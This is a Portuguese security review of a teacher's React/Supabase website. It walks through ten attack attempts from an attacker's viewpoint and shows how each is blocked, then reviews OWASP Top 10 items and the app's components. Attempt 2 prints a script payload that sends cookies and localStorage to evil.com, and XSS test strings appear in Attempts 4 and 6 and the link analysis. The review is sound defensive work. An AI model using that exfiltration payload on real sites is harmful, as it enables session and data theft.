# Análise de Segurança — Prof. William Melo Site

**Data:** 2026-03-21
**Revisor:** Engenheiro full-stack sênior + perspectiva ofensiva (red team)
**Versão do app:** 2.0 (pós migration 003)

---

## VERSÃO EM LINGUAGEM NATURAL

### Pensando como um atacante: o que eu tentaria?

Se eu fosse um hacker com acesso ao código-fonte deste site, estas seriam minhas tentativas, em ordem de probabilidade:

---

**Tentativa 1 — Alterar dados sem ser admin**

Eu abriria o DevTools do navegador, localizaria a URL do Supabase e a chave `anon` (visíveis no código JavaScript público), e tentaria chamar diretamente a API para inserir um projeto falso ou apagar todos os depoimentos.

→ **Resultado: bloqueado.** O banco de dados tem políticas RLS ativas. A chave `anon` só tem permissão de leitura. Qualquer escrita exige que a função `is_admin()` retorne `true`, o que só acontece se a sessão JWT contiver o e-mail registrado em `admin_settings`. Não tem como forjar isso.

---

**Tentativa 2 — Injetar HTML malicioso nos embeds**

Eu seria o admin (ou teria comprometido a conta), entraria no Modo Exu e colocaria no campo `embed_code` de um projeto o seguinte código:

```html
<script>
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify({ cookies: document.cookie, storage: localStorage })
  });
  window.top.location = 'https://fake-site.com';
</script>
```

→ **Resultado: bloqueado.** O embed é renderizado dentro de um `<iframe sandbox>` sem `allow-same-origin`. Isso significa que o script dentro do iframe não tem acesso ao `document.cookie`, ao `localStorage`, nem ao DOM do site externo. A tentativa de redirecionar `window.top` também falha porque `allow-top-navigation` está ausente. O código roda num mundo completamente isolado.

---

**Tentativa 3 — Acessar o painel admin digitando a URL**

Eu digitaria `https://site.com/exu` diretamente no navegador, esperando ver o painel.

→ **Resultado: bloqueado.** Sem sessão ativa, a página mostra apenas uma tela vazia com a mensagem "Faça login com o e-mail admin pelo botão no topo do site." Nenhum dado é exposto.

---

**Tentativa 4 — XSS via campos de texto**

Eu tentaria registrar um projeto com o título `<script>alert(document.cookie)</script>`, esperando que quando outro usuário visitasse o site o script executasse.

→ **Resultado: bloqueado.** O React escapa automaticamente todo conteúdo ao renderizar JSX. O texto `<script>alert(...)` aparece como texto literal, nunca como HTML interpretado.

---

**Tentativa 5 — Força bruta na senha do admin**

Eu tentaria milhares de combinações de senha até acertar.

→ **Resultado: mitigado.** O Supabase possui rate limiting nativo em tentativas de autenticação. Após várias tentativas erradas, o endpoint `/auth/v1/token` começa a retornar erros antes de processar novas tentativas.

---

**Tentativa 6 — Roubar o token de sessão via JavaScript**

Se eu conseguisse executar JavaScript na página (por XSS), eu tentaria `localStorage.getItem('sb-...-auth-token')` para roubar a sessão do admin.

→ **Resultado: mitigado.** XSS em campos de texto é bloqueado pelo React. O único vetor seria um embed malicioso, mas o sandbox sem `allow-same-origin` impede acesso ao localStorage do host. Sem XSS, não há como executar JavaScript no contexto do site.

---

**Tentativa 7 — Apagar dados via API sem deixar rastro**

Mesmo se eu conseguisse acesso admin, tentaria apagar registros e cobrir os rastros.

→ **Resultado: bloqueado (desde migration 003).** Todas as operações de INSERT, UPDATE e DELETE são automaticamente registradas na tabela `audit_log` por triggers do banco de dados. O trigger roda com `SECURITY DEFINER`, o que significa que nem o próprio usuário admin pode impedir o registro. O `audit_log` não tem políticas de DELETE — ninguém pode apagar as entradas.

---

**Tentativa 8 — Clickjacking (sobrepor o site em um iframe)**

Eu criaria uma página falsa que carregasse este site num iframe invisível, induzindo o usuário a clicar em botões sem saber.

→ **Resultado: bloqueado.** O header `X-Frame-Options: SAMEORIGIN` impede que o site seja incorporado em iframes de origens externas.

---

**Tentativa 9 — Downgrade HTTPS para HTTP**

Em redes controladas (hotspot malicioso), eu tentaria interceptar a conexão forçando HTTP.

→ **Resultado: bloqueado.** O header `Strict-Transport-Security: max-age=31536000` instrui o navegador a sempre usar HTTPS para este domínio pelo próximo ano. Uma vez que o usuário visitou o site por HTTPS, o navegador rejeita conexões HTTP automaticamente.

---

**Tentativa 10 — Vazar e-mail do admin pela API pública**

A tabela `admin_settings` contém o e-mail do admin. Eu tentaria lê-la via API pública.

→ **Resultado: bloqueado.** A tabela `admin_settings` não tem policy pública de SELECT. Com RLS habilitado e sem policy, qualquer consulta de usuário anônimo retorna zero linhas.

---

### O que ainda tem risco residual?

| Risco | Probabilidade | Impacto | Mitigação atual |
|---|---|---|---|
| Compromisso da senha do admin | Baixa | Alto | Usar senha forte; Supabase tem rate limiting |
| Embed malicioso inserido pelo admin legítimo | Muito baixa | Baixo | Sandbox isola completamente; admin é o proprietário |
| Dependência desatualizada com CVE | Baixa | Médio | Rodar `npm audit` regularmente |
| Supabase anon key encontrada em repositório público | Baixa | Baixo | Anon key é pública por design; RLS protege os dados |

---

## VERSÃO TÉCNICA

### Modelo de Ameaças — STRIDE

| Categoria STRIDE | Ameaça | Mitigação |
|---|---|---|
| **Spoofing** (falsificação de identidade) | Forjar sessão admin | JWT assinado pelo Supabase; `is_admin()` verifica email no banco |
| **Tampering** (alteração de dados) | Editar banco via API direta | RLS: todas as escritas exigem `is_admin() = true` |
| **Repudiation** (negar ações) | Admin nega ter feito alteração | `audit_log` com triggers `SECURITY DEFINER` — imutável |
| **Information Disclosure** (vazamento) | Ler `admin_settings` como anon | Sem policy pública; RLS bloqueia |
| **Denial of Service** | Flood de requests | Supabase rate limiting; Vercel edge cache absorve tráfego |
| **Elevation of Privilege** | Usuário comum virar admin | JWT claims não manipuláveis no client; RLS server-side |

---

### OWASP Top 10 — Análise Completa

#### A01 — Broken Access Control
**Status: MITIGADO**

- RLS habilitado em todas as 5 tabelas
- `is_admin()` com `SECURITY DEFINER STABLE` — roda como superuser no banco, não pode ser bypassada pelo client
- Rota `/exu` não renderiza conteúdo sem `session && isAdmin === true`
- Client nunca recebe `service_role` key
- `audit_log` sem policy de DELETE — log é imutável mesmo para admin

#### A02 — Cryptographic Failures
**Status: MITIGADO**

- Toda comunicação via HTTPS (Supabase + Vercel)
- `Strict-Transport-Security` header força HTTPS no navegador
- Senhas gerenciadas pelo Supabase Auth (bcrypt internamente)
- Tokens JWT com expiração padrão (1h access token + refresh token)
- Nenhum segredo além das chaves públicas por design está em variáveis `VITE_*`

#### A03 — Injection
**Status: MITIGADO**

- **SQL Injection:** Supabase SDK usa queries parametrizadas internamente — zero SQL raw no client
- **XSS via campos de texto:** React escapa automaticamente todo conteúdo em JSX
- **HTML Injection via `embed_code`:** renderizado exclusivamente via `<iframe sandbox>` sem `allow-same-origin`
- **URL Injection via `access_link`/`link`:** código verifica prefixo `http`/`https`/`/` antes de renderizar como link clicável; `javascript:` URLs nunca chegam a ser href ativos
- Zero uso de `eval()`, `innerHTML`, `dangerouslySetInnerHTML` no código de produção

```jsx
// SEGURO — embed completamente isolado
<iframe
  srcDoc={code}
  sandbox="allow-scripts allow-popups allow-forms"
  referrerPolicy="no-referrer"
/>

// NUNCA FAZER — XSS direto
<div dangerouslySetInnerHTML={{ __html: code }} />
```

#### A04 — Insecure Design
**Status: MITIGADO**

- E-mail admin armazenado no banco (não hardcoded)
- Separação clara entre dados públicos (anon: leitura) e administrativos (autenticado + isAdmin: escrita)
- Sem rotas de debug, endpoints de diagnóstico ou dados de desenvolvimento em produção
- Audit log como parte do design desde a migration 003

#### A05 — Security Misconfiguration
**Status: MITIGADO**

Headers de segurança em `vercel.json`:

```json
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()
Content-Security-Policy: [restricts scripts, styles, frames, connect]
```

- CSP bloqueia `object-src`, `base-uri`, `form-action` para origens externas
- `.env` no `.gitignore`
- Service role key nunca exposta no frontend

**Risco residual:** `script-src 'unsafe-inline'` no CSP é necessário para o bundle do Vite. Nonces por script não são suportados nativamente por Vite sem plugin. Mitigação: o risco prático é baixo porque XSS via campos de texto é bloqueado pelo React.

#### A06 — Vulnerable and Outdated Components
**Status: A MONITORAR**

- React 19.2, Supabase 2.87, Vite 7.2 — versões recentes ao momento de escrita
- Ação recomendada: executar `npm audit` antes de cada deploy e corrigir vulnerabilidades críticas/altas

#### A07 — Identification and Authentication Failures
**Status: MITIGADO**

- Autenticação delegada ao Supabase Auth (implementação auditada por terceiros)
- Rate limiting nativo em `/auth/v1/token` (Supabase Go True)
- Mensagem de erro genérica ("E-mail ou senha inválidos") — sem enumeração de e-mails
- Logout explícito destroi sessão no servidor via `supabase.auth.signOut()`
- `is_admin()` com comparação case-insensitive (migration 003) evita edge cases de case no e-mail

#### A08 — Software and Data Integrity Failures
**Status: MITIGADO**

- Sem deserialização insegura de dados externos
- Embeds HTML em sandbox impedem supply chain via conteúdo incorporado
- Build determinístico com `package-lock.json` commitado

#### A09 — Security Logging and Monitoring
**Status: IMPLEMENTADO (migration 003)**

- Tabela `audit_log` com triggers `AFTER INSERT OR UPDATE OR DELETE` em todas as tabelas críticas
- Trigger usa `SECURITY DEFINER` — não pode ser desativado ou bypassado por usuário admin
- Log inclui: tabela, operação, record_id, old_data (JSONB), new_data (JSONB), user_email, user_id, timestamp
- Visível no Modo Exu (painel admin), seção "Segurança"
- Ação recomendada: configurar alertas no Supabase para DELETEs em massa em projetos/bibliography

#### A10 — Server-Side Request Forgery (SSRF)
**Status: N/A**

- Sem servidor próprio — frontend puro + Supabase BaaS
- Sem proxy de URLs no código
- Sem fetches server-side para URLs fornecidas pelo usuário

---

### Análise de Segurança por Componente

#### `ItemDetailPage.jsx` — SafeEmbed
```jsx
// Vetor de ataque: admin insere código malicioso em embed_code
// Superfície: qualquer HTML/JS

<iframe
  srcDoc={code}
  sandbox="allow-scripts allow-popups allow-forms"
  // SEM allow-same-origin: isola o contexto de origem
  // SEM allow-top-navigation: não pode redirecionar o parent
  // SEM allow-downloads: não pode iniciar downloads silenciosos
  referrerPolicy="no-referrer"
  loading="lazy"
/>
```
**Veredito:** ataque viável apenas se `allow-same-origin` fosse adicionado. Sem ele, o iframe é uma caixa completamente selada.

#### `AuthContext.jsx` — verificação de admin
```javascript
// Único ponto de verdade sobre isAdmin
const { data, error } = await supabase.rpc('is_admin');
setIsAdmin(data === true);
// Se RPC falhar (rede, erro), assume false — fail secure
```
**Veredito:** implementação segura. Falha fecha o acesso (não abre).

#### `ExuMode/index.jsx` — guarda de rota
```javascript
if (!session || !isAdmin) {
  return <UnauthorizedUI />;
}
return <ExuDashboard />;
```
**Veredito:** dupla verificação (session E isAdmin). Não há como acessar o dashboard sem ambos.

#### `BiblioCard.jsx` / `ProjectCard.jsx` — links externos
```javascript
// URL injection analysis
href={url.startsWith('http') ? url : `https://${url}`}
// 'javascript:alert(1)' → não começa com 'http' → se torna 'https://javascript:alert(1)'
// → URL inválida, não executa JavaScript
```
**Veredito:** `javascript:` URLs não chegam a ser links ativos. Proteção adequada.

#### `ExuTableEditor.jsx` — operações de escrita
- Payload de update não inclui campos `readOnly`
- Validação de campos obrigatórios no frontend (complementa a constraint `NOT NULL` do banco)
- Confirmação antes de DELETE
- `audit_log` é read-only no painel (sem botões de add/edit/delete)

---

### Checklist de Deploy Seguro

**Banco de dados:**
- [x] RLS habilitado em todas as tabelas
- [x] `is_admin()` criada com `SECURITY DEFINER` e comparação case-insensitive
- [x] Migration 002 aplicada (embed_code, featured_image_url, admin_settings)
- [x] Migration 003 aplicada (audit_log, triggers, constraints de tamanho)
- [x] Usuário admin criado no Supabase Auth com senha forte
- [x] `admin_settings` com `admin_email` correto

**Frontend/Hosting:**
- [x] `VITE_SUPABASE_URL` e `VITE_SUPABASE_ANON_KEY` em variáveis de ambiente do Vercel
- [x] `SUPABASE_SERVICE_ROLE_KEY` **nunca** adicionada ao frontend
- [x] Headers de segurança configurados em `vercel.json`
- [x] HTTPS forçado via HSTS
- [x] `npm audit` sem vulnerabilidades críticas

**Operacional:**
- [ ] Configurar alertas no Supabase para operações de DELETE em massa
- [ ] Revisar `npm audit` a cada deploy
- [ ] Rotacionar senha admin se houver suspeita de comprometimento

---

### Dependências e Versões (momento da análise)

| Pacote | Versão | CVE conhecidos |
|---|---|---|
| react | 19.2.0 | Nenhum |
| @supabase/supabase-js | 2.87.0 | Nenhum |
| vite | 7.2.4 | Nenhum |
| swiper | 12.0.3 | Nenhum |
| lucide-react | 0.556.0 | Nenhum |
| tailwindcss | 3.4.17 | Nenhum |

Executar `npm audit` antes de cada deploy para verificar novas CVEs.
